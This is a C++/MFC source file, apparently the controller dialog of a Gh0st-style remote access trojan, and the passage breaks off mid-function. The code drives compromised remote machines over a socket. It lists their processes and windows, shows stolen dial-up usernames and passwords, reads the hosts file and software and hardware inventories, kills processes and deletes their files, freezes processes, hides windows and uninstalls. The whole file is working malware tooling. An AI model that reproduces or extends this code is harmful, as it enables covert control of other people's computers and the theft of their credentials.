// SystemDlg.cpp : implementation file
//

#include "stdafx.h"
#include "Client.h"
#include "SystemDlg.h"
#include "FileAttr.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CSystemDlg dialog

extern int	GetIconIndex(LPCTSTR lpFileName, DWORD dwFileAttributes);    //处理图标

CSystemDlg::CSystemDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialog(CSystemDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CSystemDlg)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
	m_iocpServer = pIOCPServer;
	m_pContext = pContext;

	dwPrs = 0;
	m_bOnClose = FALSE;

	SHFILEINFO	sfi;
	SHGetFileInfo
		(
		"\\\\",
		FILE_ATTRIBUTE_NORMAL, 
		&sfi,
		sizeof(SHFILEINFO), 
		SHGFI_ICON | SHGFI_USEFILEATTRIBUTES
		);
	HIMAGELIST hImageList;
	// 加载系统图标列表
	
	hImageList = (HIMAGELIST)SHGetFileInfo
		(
		NULL,
		0,
		&sfi,
        sizeof(SHFILEINFO),
		SHGFI_SMALLICON | SHGFI_SYSICONINDEX
		);
	m_ImageList = CImageList::FromHandle(hImageList);
}


void CSystemDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CSystemDlg)
	DDX_Control(pDX, IDC_TAB, m_Tab);
	DDX_Control(pDX, IDC_LIST, m_List);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CSystemDlg, CDialog)
	//{{AFX_MSG_MAP(CSystemDlg)
	ON_WM_CLOSE()
	ON_WM_SIZE()
	ON_NOTIFY(TCN_SELCHANGE, IDC_TAB, OnSelchangeTab)
	ON_NOTIFY(NM_RCLICK, IDC_LIST, OnRclickList)
	ON_COMMAND(IDM_REFRESHPSLIST, OnRefreshpslist)
	ON_COMMAND(ID_SYSTEM_COPY, OnSystemCopy)
	ON_COMMAND(ID_SYSTEM_KILLANDDEL, OnSystemKillanddel)
	ON_COMMAND(ID_SYSTEM_KILLPROCESS, OnSystemKillprocess)
	ON_COMMAND(ID_FREEZING, OnFreezing)
	ON_COMMAND(ID_THAW, OnThaw)
	ON_COMMAND(ID_FILEATTR, OnFileattr)
	ON_COMMAND(ID_BAIDU, OnBaidu)
	ON_COMMAND(ID_WORLD, OnWorld)
	ON_COMMAND(ID_SYSTEM_WINDOW_RETURN, OnSystemWindowReturn)
	ON_COMMAND(ID_SYSTEM_WINDOW_HIDE, OnSystemWindowHide)
	ON_COMMAND(ID_SYSTEM_WINDOW_CLOST, OnSystemWindowClost)
	ON_COMMAND(ID_SYSTEM_WINDOW_MAX, OnSystemWindowMax)
	ON_COMMAND(ID_SYSTEM_WINDOW_MIN, OnSystemWindowMin)
	ON_COMMAND(ID_SYSTEM_UNINSTALL, OnSystemUninstall)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()
void CSystemDlg::OnReceiveComplete()
{
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_PSLIST:
		ShowProcessList();
		break;
	case TOKEN_WSLIST:
		ShowWindowsList();
		break;
	case TOKEN_FILEATTR:
		ShowFileAttr();
		break;
	case TOKEN_DIALUPASS:
		ShowDialupassList();
		break;
	case TOKEN_SOFTWARE:
		ShowSoftWareList();
		break;
	case TOKEN_HOSTS:
		ShowHostsList();
		break;
	case TOKEN_HARDWARE:
		ShowHardwareList();
		break;
	default:
		// 传输发生异常数据
		break;
	}
}
/////////////////////////////////////////////////////////////////////////////
// CSystemDlg message handlers

BOOL CSystemDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	// TODO: Add extra initialization here
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	CString str;
	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
	IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
	str.Format("\\\\%s - 系统管理", bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "");
	SetWindowText(str);
	
	m_Tab.InsertItem(0, "进程管理");
	m_Tab.InsertItem(1, "窗口管理");
	m_Tab.InsertItem(2, "拨号密码");
	m_Tab.InsertItem(3, "软件信息");
	m_Tab.InsertItem(4, "HOST文件");
	m_Tab.InsertItem(5, "硬件信息");

	AdjustList();
    ShowProcessList();

// 	UINT uiGroupFind[] = {IDM_REFRESHPSLIST,ID_SYSTEM_COPY,ID_SYSTEM_KILLANDDEL,ID_SYSTEM_KILLPROCESS,ID_FREEZING,ID_THAW,ID_FILEATTR,ID_BAIDU,ID_WORLD,ID_SYSTEM_WINDOW_RETURN,ID_SYSTEM_WINDOW_HIDE,ID_SYSTEM_WINDOW_CLOST,ID_SYSTEM_WINDOW_MAX,ID_SYSTEM_WINDOW_MIN,ID_SYSTEM_UNINSTALL};
//  XTPImageManager()->SetIcons(IDB_MENU_SYSTEM, uiGroupFind, sizeof(uiGroupFind)/sizeof(UINT), CSize(16, 16));

	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}


void CSystemDlg::AdjustList()
{
	RECT	rectClient;
	RECT	rectList;
	RECT	rectTab;

	GetClientRect(&rectClient);
	rectList.left = 0;
	rectList.top = 22;
	rectList.right = rectClient.right;
	rectList.bottom = rectClient.bottom - 0;

	rectTab.left = 0;
	rectTab.top = 0;
	rectTab.right = rectClient.right - 5;
	rectTab.bottom = rectClient.bottom - 25;
	
	m_Tab.MoveWindow(&rectTab);
	m_List.MoveWindow(&rectList);
}

CString __MakePriority(DWORD dwPriClass)
{
	CString strRet;
	switch(dwPriClass)
	{
	case REALTIME_PRIORITY_CLASS:
		strRet = "实时";
		break;
	case HIGH_PRIORITY_CLASS:
		strRet = "高";
		break;
	case ABOVE_NORMAL_PRIORITY_CLASS:
		strRet = "高于标准";
		break;
	case NORMAL_PRIORITY_CLASS:
		strRet = "标准";
		break;
	case BELOW_NORMAL_PRIORITY_CLASS:
		strRet = "低于标准";
		break;
	case IDLE_PRIORITY_CLASS:
		strRet = "空闲";
		break;
	default:
		strRet = "未知";
		break;
	}
	
	return strRet;
}

void CSystemDlg::ShowProcessList()
{
	DeleteList();
	
	m_List.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT| LVS_EX_SUBITEMIMAGES);
	
	m_List.InsertColumn(0, "映像名称", LVCFMT_LEFT, 100);
	m_List.InsertColumn(1, "PID", LVCFMT_LEFT, 50);
	m_List.InsertColumn(2, "优先级", LVCFMT_LEFT, 50);
	m_List.InsertColumn(3, "线程数", LVCFMT_LEFT, 50);
	m_List.InsertColumn(4, "用户名", LVCFMT_LEFT, 70);
	m_List.InsertColumn(5, "内存", LVCFMT_LEFT, 70);
	m_List.InsertColumn(6, "文件大小", LVCFMT_LEFT, 80);
	m_List.InsertColumn(7, "程序路径", LVCFMT_LEFT, 300);
	
	m_List.SetImageList(m_ImageList,LVSIL_SMALL);
	
	char	*lpBuffer = (char *)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	char	*strExeFile;
	char	*strProcessName;
	char    *strTemp; 
	DWORD	dwOffset = 0;
	CString str;
	char	*strProcessUser;
	int		i;
	for (i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		LPDWORD	lpPID = LPDWORD(lpBuffer + dwOffset);
		strExeFile = lpBuffer + dwOffset + sizeof(DWORD);
		strProcessName = strExeFile + lstrlen(strExeFile) + 1;
		strTemp = strProcessName + lstrlen(strProcessName)+1;
		LPDWORD	lpdwPriClass = LPDWORD(strTemp);
		LPDWORD	lpdwThreads = LPDWORD(strTemp + sizeof(DWORD));
		strProcessUser = strTemp + sizeof(DWORD)*2;
		LPDWORD	lpdwWorkingSetSize = LPDWORD(strProcessUser + lstrlen(strProcessUser)+1);
		
		LPDWORD	lpdwFileSize = LPDWORD(strProcessUser + lstrlen(strProcessUser)+1 + sizeof(DWORD));
		
		m_List.InsertItem(i, strExeFile,GetIconIndex(strProcessName,GetFileAttributes(strProcessName)));
		
		str.Format("%5u", *lpPID);
		m_List.SetItemText(i, 1, str);
		
		m_List.SetItemText(i, 2,__MakePriority(*lpdwPriClass));
		
		str.Format("%5u", *lpdwThreads);
		m_List.SetItemText(i, 3, str);
		
		m_List.SetItemText(i, 4, strProcessUser);
		
		str.Format("%5u K",*lpdwWorkingSetSize);
		m_List.SetItemText(i, 5 , str); 
		
		str.Format("%5u KB",*lpdwFileSize);
		m_List.SetItemText(i, 6 , str); 
		
		m_List.SetItemText(i, 7, strProcessName);
		
		// ItemData 为进程ID
		m_List.SetItemData(i, *lpPID);
		dwOffset += sizeof(DWORD)*5 + lstrlen(strExeFile) + lstrlen(strProcessName) + lstrlen(strProcessUser) + 3;
	}
	
	str.Format("程序路径 / %d", i);
	LVCOLUMN lvc;
	lvc.mask = LVCF_TEXT;
	lvc.pszText = str.GetBuffer(0);
	lvc.cchTextMax = str.GetLength();
	m_List.SetColumn(7, &lvc);
}

//显示文件属性
void CSystemDlg::ShowFileAttr()
{
	CFileStatus FileAttr;
	LPBYTE lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	
	memcpy(&FileAttr,lpBuffer,sizeof(CFileStatus));
	/**************************创建非模态对话框**********************************/
	CFileAttr dlg(this);
	dlg.m_strSize.Format("%dKB",FileAttr.m_size / 1024);//文件大小
	dlg.m_strCTime = FileAttr.m_ctime.Format("%Y年%m月%d日 %H:%M:%S");//创建时间
	dlg.m_strMTime = FileAttr.m_mtime.Format("%Y年%m月%d日 %H:%M:%S");//修改时间
	dlg.m_strATime = FileAttr.m_atime.Format("%Y年%m月%d日 %H:%M:%S");//访问时间
	if((FileAttr.m_attribute & 0x01) == 0x01)
		dlg.m_bReadOnly = TRUE;
	else
		dlg.m_bReadOnly = FALSE;
	//判断是否隐藏
	if((FileAttr.m_attribute & 0x02) == 0x02)
		dlg.m_bHidden = TRUE;
	else
		dlg.m_bHidden = FALSE;
	//判断是否存档
	if((FileAttr.m_attribute & 0x20) == 0x20)
		dlg.m_bArchive = TRUE;
	else
		dlg.m_bArchive = FALSE;
	//判断是否是系统文件
	if((FileAttr.m_attribute & 0x04) == 0x04)
		dlg.m_bSystem = TRUE;
	else
		dlg.m_bSystem = FALSE;
	
	dlg.m_FilePath = FileAttr.m_szFullName; //文件路径
	
	int i = dlg.m_FilePath.ReverseFind('\\');
	if(i > 0)
		dlg.m_FileName = dlg.m_FilePath.Mid(i+1);
	
	dlg.DoModal();
}

void CSystemDlg::ShowWindowsList()
{
	DeleteList();
	m_List.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT | LVS_EX_SUBITEMIMAGES);
	m_List.InsertColumn(0, "PID", LVCFMT_LEFT, 75);
	m_List.InsertColumn(1, "句柄", LVCFMT_LEFT, 70);
	m_List.InsertColumn(2, "窗口名称", LVCFMT_LEFT, 250);
	m_List.InsertColumn(3, "窗口状态", LVCFMT_LEFT, 70);
	
	
	m_ImgList.Create(16, 16,ILC_COLOR8|ILC_MASK,15,1);
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_SYSTEMICO_WIN));	
	m_List.SetImageList(&m_ImgList,LVSIL_SMALL);
	
	LPBYTE lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD	dwOffset = 0;
	char	*lpTitle = NULL;
	CString	str;
	int i;
	for (i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		
		LPDWORD	lpPID = LPDWORD(lpBuffer + dwOffset);
		LPDWORD	hwnd = LPDWORD(lpBuffer + dwOffset + sizeof(DWORD));
		lpTitle = (char *)lpBuffer + dwOffset + sizeof(DWORD)*2;
		str.Format("%5u", *lpPID);
		m_List.InsertItem(i, str);
		str.Format("%5u", *hwnd);
		m_List.SetItemText(i, 1,str);
		m_List.SetItemText(i, 2, lpTitle);
		m_List.SetItemText(i, 3,"显示");
		// ItemData 为进程ID
		m_List.SetItemData(i, *lpPID);
		dwOffset += sizeof(DWORD)*2 + lstrlen(lpTitle) + 1;
	}
	str.Format("窗口名称 / %d", i);
	LVCOLUMN lvc;
	lvc.mask = LVCF_TEXT;
	lvc.pszText = str.GetBuffer(0);
	lvc.cchTextMax = str.GetLength();
	m_List.SetColumn(2, &lvc);
}

void CSystemDlg::ShowDialupassList()
{
	DeleteList();
	m_List.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT| LVS_EX_SUBITEMIMAGES);
	
	m_List.InsertColumn(0, "名称", LVCFMT_LEFT, 75);
	m_List.InsertColumn(1, "用户", LVCFMT_LEFT, 90);
	m_List.InsertColumn(2, "密码", LVCFMT_LEFT, 90);
	m_List.InsertColumn(3, "电话/主机", LVCFMT_LEFT, 160);
	m_List.InsertColumn(4, "设备", LVCFMT_LEFT, 220);
	
	m_ImgList.Create(16, 16,ILC_COLOR8|ILC_MASK,15,1);
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_SYSTEM_NET));	
	m_List.SetImageList(&m_ImgList,LVSIL_SMALL);
	
	
	LPBYTE	lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD	dwOffset = 0;
	
	for (int i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		for (int j = 0; j < 6; j++)
		{
			char *lpString = (char *)lpBuffer + dwOffset;
			if (j > 0)
			{
				if (j == 1)
					m_List.InsertItem(i, lpString);
				else
					m_List.SetItemText(i, j - 1, lpString);
			}
			dwOffset += lstrlen(lpString) + 1;
		}
	}
}

void CSystemDlg::ShowSoftWareList()
{
	DeleteList();
	m_List.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT|LVS_EX_UNDERLINEHOT |LVS_EX_SUBITEMIMAGES);
	m_List.InsertColumn(0, "软件名称", LVCFMT_LEFT, 130);
	m_List.InsertColumn(1, "发行商", LVCFMT_LEFT, 85);
	m_List.InsertColumn(2, "版本", LVCFMT_LEFT, 75);
	m_List.InsertColumn(3, "安装时间", LVCFMT_LEFT, 80);
	m_List.InsertColumn(4, "卸载命令及参数", LVCFMT_LEFT, 300);
	
	m_ImgList.Create(16, 16,ILC_COLOR8|ILC_MASK,15,1);
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_SYSTEM_SOFTWARE));	
	m_List.SetImageList(&m_ImgList,LVSIL_SMALL);
	
	LPBYTE	lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD	dwOffset = 0;
	
	for (int i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		for (int j = 0; j < 5; j++)
		{
			char *lpString = (char *)lpBuffer + dwOffset;
			
			if (j == 0)
				m_List.InsertItem(i, lpString);
			else
				m_List.SetItemText(i, j, lpString);
			
			dwOffset += lstrlen(lpString) + 1;
		}
	}
}

void CSystemDlg::ShowHostsList()
{
	
	DeleteList();
	m_List.SetExtendedStyle(LVS_EX_FLATSB);
	m_List.InsertColumn(0, "数据", LVCFMT_LEFT, 600);

	
	LPBYTE	lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	
	int i=0;
	
	char *lpString = (char *)lpBuffer ;
	const char* d = "\n";
	char *p = strtok(lpString,d);
	while(p)
	{	
		m_List.InsertItem(i, p,10);
		p = strtok(NULL,d);
		i++;
	}
	
}

void CSystemDlg::ShowHardwareList()
{
	
	DeleteList();
	m_List.SetExtendedStyle(LVS_EX_FLATSB | LVS_EX_FULLROWSELECT|LVS_EX_UNDERLINEHOT |LVS_EX_SUBITEMIMAGES);
	m_List.InsertColumn(0, "硬件名称", LVCFMT_LEFT, 600);
	
	
	m_ImgList.Create(16, 16,ILC_COLOR8|ILC_MASK,15,1);
	m_ImgList.Add(AfxGetApp()->LoadIcon(IDI_SYSTEM_HARF));	
	m_List.SetImageList(&m_ImgList,LVSIL_SMALL);
	
	
	CString str;
	LPBYTE	lpBuffer = (LPBYTE)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD	dwOffset = 0;
	int i;
	
	for (i = 0; dwOffset < m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1; i++)
	{
		for (int j = 0; j < 1; j++)
		{
			char *lpString = (char *)lpBuffer + dwOffset;
			if (j == 0)
				m_List.InsertItem(i, lpString);
			else
				m_List.SetItemText(i, j , lpString);
			dwOffset += lstrlen(lpString) + 1;
		}
	}
	
	str.Format("硬件名称 / %d", i);
	LVCOLUMN lvc;
	lvc.mask = LVCF_TEXT;
	lvc.pszText = str.GetBuffer(0);
	lvc.cchTextMax = str.GetLength();
	m_List.SetColumn(0, &lvc);
	
	
}


BOOL CSystemDlg::PreTranslateMessage(MSG* pMsg) 
{
	// TODO: Add your specialized code here and/or call the base class
	
	if ( pMsg->message == WM_KEYDOWN && pMsg->wParam  == VK_F5)
	{
//		OnMenuitemRefreshSlist();
		return TRUE;
	}
	if (pMsg->message == WM_KEYDOWN && (pMsg->wParam == VK_RETURN || pMsg->wParam == VK_ESCAPE))
	{
		return true;
	}
	return CDialog::PreTranslateMessage(pMsg);
}

void CSystemDlg::OnClose() 
{
	// TODO: Add your message handler code here and/or call default
	closesocket(m_pContext->m_Socket);
	
	m_bOnClose = TRUE;
	CDialog::OnClose();
}

void CSystemDlg::PostNcDestroy() 
{
	// TODO: Add your specialized code here and/or call the base class
	if(!m_bOnClose)
		OnClose();
	
	
	delete this;
	CDialog::PostNcDestroy();
}

void CSystemDlg::OnSize(UINT nType, int cx, int cy) 
{
	if (!IsWindowVisible())
		return;
	// TODO: Add your message handler code here
	AdjustList();
}

void CSystemDlg::OnSelchangeTab(NMHDR* pNMHDR, LRESULT* pResult) 
{
	// TODO: Add your control notification handler code here
	ShowSelectWindow();
	*pResult = 0;
}

void CSystemDlg::DeleteList()
{
	m_List.DeleteAllItems();	
	int nColumnCount= m_List.GetHeaderCtrl()->GetItemCount();
	
	for(int n=0;n<nColumnCount;n++)
	{
		m_List.DeleteColumn(0);
	}
}

void CSystemDlg::ShowSelectWindow()
{
	DeleteList();
	switch (m_Tab.GetCurSel())
	{
	case 0:
		GetProcessList();
		break;
	case 1:
		GetWindowsList();
		break;
	case 2:
		GetDialupassList();
		break;
	case 3:
		GetSoftWareList();
		break;
	case 4:
		GetHostsList();
		break;
	case 5:
		GetHardwareList();
		break;
	default:
		break;
	}
}

void CSystemDlg::GetProcessList()
{
	BYTE bToken = COMMAND_PSLIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}

void CSystemDlg::GetWindowsList()
{
	BYTE bToken = COMMAND_WSLIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}

void CSystemDlg::GetDialupassList()
{	
	BYTE bToken = COMMAND_DSLIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}

void CSystemDlg::GetSoftWareList()
{
	BYTE bToken = COMMAND_SOFTWARELIST;
	m_iocpServer->Send(m_pContext, &bToken, 1);
}

void CSystemDlg::GetHostsList()
{
	BYTE bToken = COMMAND_HOSTS;
	m_iocpServer->Send(m_pContext, &bToken, 1);	
}

void CSystemDlg::GetHardwareList()
{
	BYTE bToken = COMMAND_HARDWARE;
	m_iocpServer->Send(m_pContext, &bToken, 1);	
}

void CSystemDlg::OnRclickList(NMHDR* pNMHDR, LRESULT* pResult) 
{
	// TODO: Add your control notification handler code here
	CMenu	popup;
	popup.LoadMenu(IDR_MENU_SYSTEM);
	CMenu*	pM = popup.GetSubMenu(0);
	CPoint	p;
	GetCursorPos(&p);
	
	int a1[10] = {11,12,13,14,15,16,17,18,19,20};
	int a2[11] =  {3,4,5,6,7,8,9,10,11,19,20};
	int a3[18] = {3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20};
	int a4[17] = {3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,20};
	int a5[17] = {3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,20};
	int a6[17] = {3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,20};
	switch(m_Tab.GetCurSel())
	{
	case 0:
		{
			for (int i = 10 ; i> 0;i--)
			{
				pM->DeleteMenu(a1[i-1], MF_BYPOSITION);
			}
		}
		break;
	case 1:
		{
			for (int i = 11 ; i> 0;i--)
			{
				pM->DeleteMenu(a2[i-1], MF_BYPOSITION);
			}
		}
		break;
	case 2:
		{
			for (int i = 18 ; i> 0;i--)
			{
				pM->DeleteMenu(a3[i-1], MF_BYPOSITION);
			}
		}
		break;
	case 3:
		{
			for (int i = 17 ; i> 0;i--)
			{
				pM->DeleteMenu(a4[i-1], MF_BYPOSITION);
			}
		}
	case 4:
		{
			for (int i = 17 ; i> 0;i--)
			{
				pM->DeleteMenu(a5[i-1], MF_BYPOSITION);
			}
		}
	case 5:
		{
			for (int i = 17 ; i> 0;i--)
			{
				pM->DeleteMenu(a6[i-1], MF_BYPOSITION);
			}
		}
		break;
	default:
		break;
	}
	
	CXTPCommandBars::TrackPopupMenu(pM, 0, p.x, p.y, this);
	*pResult = 0;
}

void CSystemDlg::OnRefreshpslist() 
{
	// TODO: Add your command handler code here
	ShowSelectWindow();
}

void CSystemDlg::SetClipboardText(CString &Data)
{
	if(::OpenClipboard(NULL) == 0)
		return;
	EmptyClipboard();
	HGLOBAL htext = GlobalAlloc(GHND, Data.GetLength() + 1);
	if(htext != 0)
	{
		CopyMemory(GlobalLock(htext), Data.GetBuffer(0), Data.GetLength());
		GlobalUnlock(htext);
		SetClipboardData(1, (HANDLE)htext);
		GlobalFree(htext);
	}
	CloseClipboard();
}

void CSystemDlg::OnSystemCopy() 
{
	// TODO: Add your command handler code here
	if (m_List.GetSelectedCount() < 1)
	{
		return ;	
	}
	POSITION pos = m_List.GetFirstSelectedItemPosition();
	CString Data;
	CString temp;
	while(pos)
	{
		temp = "";
		int	nItem = m_List.GetNextSelectedItem(pos);
		for(int i = 0; i < m_List.GetHeaderCtrl()-> GetItemCount(); i++)
		{
			temp += m_List.GetItemText(nItem, i);
			temp += "	";
		}
		Data += temp;
		Data += "\r\n";
	}
	SetClipboardText(Data);
	MessageBox("已复制数据到剪切板");
}

// typedef SIZE_T
// (WINAPI
//  *LocalSizeT)(
//  __in HLOCAL hMem
//     );

void CSystemDlg::OnSystemKillanddel() 
{
	// TODO: Add your command handler code here
	KillprocessDel(COMMAND_KILLPROCESS,"并删除");
}

void CSystemDlg::OnSystemKillprocess() 
{
	// TODO: Add your command handler code here
	if (m_Tab.GetCurSel() == 0 )
	{
		KillprocessDel(COMMAND_KILLPROCESS,"");
	}
	else
	{
		KillprocessDel(COMMAND_KILLPROCESS_WINDOW,"");
	}
}

void CSystemDlg::KillprocessDel(BYTE Buffer ,char *strbuf) 
{
	
	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, 2 + (m_List.GetSelectedCount() * 4));
	lpBuffer[0] = Buffer;
	
	if(strbuf == "并删除")
	{
		
		lpBuffer[1] = 1;
	}
	else
	{
		
		lpBuffer[1] = 0;
	}
	
	char *lpTips = 
		"警告: 终止进程会导致不希望发生的结果，\n"
		"包括数据丢失和系统不稳定。在被终止前，\n"
		"进程将没有机会保存其状态和数据。";
	CString str;
	if (m_List.GetSelectedCount() > 1)
	{
		str.Format("%s确实\n想终止%s这%d项进程吗?", lpTips, strbuf,m_List.GetSelectedCount());	
	}
	else
	{
		str.Format("%s确实\n想终止%s该项进程吗?", lpTips, strbuf);
	}
	if (::MessageBox(m_hWnd, str, "进程结束警告", MB_YESNO|MB_ICONQUESTION) == IDNO)
		return;
	
	DWORD	dwOffset = 2;
	POSITION pos = m_List.GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	
	while(pos) //so long as we have a valid POSITION, we keep iterating
	{
		int	nItem = m_List.GetNextSelectedItem(pos);
		DWORD dwProcessID = m_List.GetItemData(nItem);
		memcpy(lpBuffer + dwOffset, &dwProcessID, sizeof(DWORD));
		dwOffset += sizeof(DWORD);
	}
	
//	LocalSizeT pLocalSize=(LocalSizeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"LocalSize");
	m_iocpServer->Send(m_pContext, lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
	ShowSelectWindow();
}

void CSystemDlg::OnFreezing() 
{
	// TODO: Add your command handler code here
	CListCtrl	*pListCtrl = NULL;
	pListCtrl = &m_List;
	
	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1 + (pListCtrl->GetSelectedCount() * 4));
	lpBuffer[0] = COMMAND_FREEZING;
	
	char *lpTips = "警告：冻结进程会导致进程暂停运行处于挂起状态";
	CString str;
	if (pListCtrl->GetSelectedCount() > 1)
	{
		str.Format("%s确实\n想冻结这%d项进程吗?", lpTips, pListCtrl->GetSelectedCount());	
	}
	else
	{
		str.Format("%s确实\n想冻结该项进程吗?", lpTips);
	}
	
	
	DWORD	dwOffset = 1;
	POSITION pos = pListCtrl->GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	
	while(pos) //so long as we have a valid POSITION, we keep iterating
	{
		int	nItem = pListCtrl->GetNextSelectedItem(pos);
		DWORD dwProcessID = pListCtrl->GetItemData(nItem);
		memcpy(lpBuffer + dwOffset, &dwProcessID, sizeof(DWORD));
		dwOffset += sizeof(DWORD);
	}
	m_iocpServer->Send(m_pContext, lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

void CSystemDlg::OnThaw() 
{
	// TODO: Add your command handler code here
	CListCtrl	*pListCtrl = NULL;
	pListCtrl = &m_List;
	
	LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1 + (pListCtrl->GetSelectedCount() * 4));
	lpBuffer[0] = COMMAND_THAW;
	
	char *lpTips = "警告：解冻进程会导致进程恢复正常运行";
	CString str;
	if (pListCtrl->GetSelectedCount() > 1)
	{
		str.Format("%s确实\n想解冻这%d项进程吗?", lpTips, pListCtrl->GetSelectedCount());	
	}
	else
	{
		str.Format("%s确实\n想解冻该项进程吗?", lpTips);
	}
	//	if (::MessageBox(m_hWnd, str, "进程冻结警告", MB_YESNO|MB_ICONQUESTION) == IDNO)
	//		return; 
	
	DWORD	dwOffset = 1;
	POSITION pos = pListCtrl->GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	
	while(pos) //so long as we have a valid POSITION, we keep iterating
	{
		int	nItem = pListCtrl->GetNextSelectedItem(pos);
		DWORD dwProcessID = pListCtrl->GetItemData(nItem);
		memcpy(lpBuffer + dwOffset, &dwProcessID, sizeof(DWORD));
		dwOffset += sizeof(DWORD);
	}
	m_iocpServer->Send(m_pContext, lpBuffer, LocalSize(lpBuffer));
	LocalFree(lpBuffer);
}

void CSystemDlg::OnFileattr() 
{
	// TODO: Add your command handler code here
	if (m_List.GetSelectedCount() < 1)
	{
		return ;	
	}
	POSITION pos = m_List.GetFirstSelectedItemPosition();
	CString str;
	while(pos)
	{
		int	nItem = m_List.GetNextSelectedItem(pos);
		str = m_List.GetItemText(nItem, 7);
		if (str.GetLength() > 0)
		{
			LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1 + str.GetLength());
			lpBuffer[0] = COMMAND_FILEATTR;
			memcpy(lpBuffer+1,str.GetBuffer(0),str.GetLength());
			m_iocpServer->Send(m_pContext,lpBuffer,str.GetLength() + 1);
		}
	}
}

void CSystemDlg::OnBaidu() 
{
	// TODO: Add your command handler code here
	if (m_List.GetSelectedCount() < 1)
	{
		return ;	
	}
	POSITION pos = m_List.GetFirstSelectedItemPosition();
	CString str;
	while(pos)
	{
		int	nItem = m_List.GetNextSelectedItem(pos);
		str = m_List.GetItemText(nItem, 0);
		if (str.GetLength() > 0)
		{
			CString url = "https://www.baidu.com/s?wd=";
			url += str;
			ShellExecute(NULL,"open",url,NULL,NULL,SW_SHOW);
		}
	}
}

void CSystemDlg::OnWorld() 
{
	// TODO: Add your command handler code here
	CString url = "http://www.virscan.org/";
	ShellExecute(NULL,"open",url,NULL,NULL,SW_SHOW);
}

void CSystemDlg::OnSystemWindowReturn() 
{
	// TODO: Add your command handler code here
	BYTE lpMsgBuf[20];
	int	nItem = m_List.GetSelectionMark();
	if (nItem >=0 )
	{
		ZeroMemory(lpMsgBuf,20);
		lpMsgBuf[0]=COMMAND_WINDOW_TEST;
		DWORD hwnd = atoi(m_List.GetItemText(nItem, 1));
		
		m_List.SetItemText(nItem,3,"显示");
		memcpy(lpMsgBuf+1,&hwnd,sizeof(DWORD));
		DWORD dHow=SW_RESTORE;
		memcpy(lpMsgBuf+1+sizeof(hwnd),&dHow,sizeof(DWORD));
		m_iocpServer->Send(m_pContext, lpMsgBuf, sizeof(lpMsgBuf));	
	}
}

void CSystemDlg::OnSystemWindowHide() 
{
	// TODO: Add your command handler code here
	BYTE lpMsgBuf[20];
	int	nItem = m_List.GetSelectionMark();
	if (nItem >=0 )
	{
		ZeroMemory(lpMsgBuf,20);
		lpMsgBuf[0]=COMMAND_WINDOW_TEST;
		DWORD hwnd = atoi(m_List.GetItemText(nItem, 1));
		
		m_List.SetItemText(nItem,3,"隐藏");
		memcpy(lpMsgBuf+1,&hwnd,sizeof(DWORD));
		DWORD dHow=SW_HIDE;
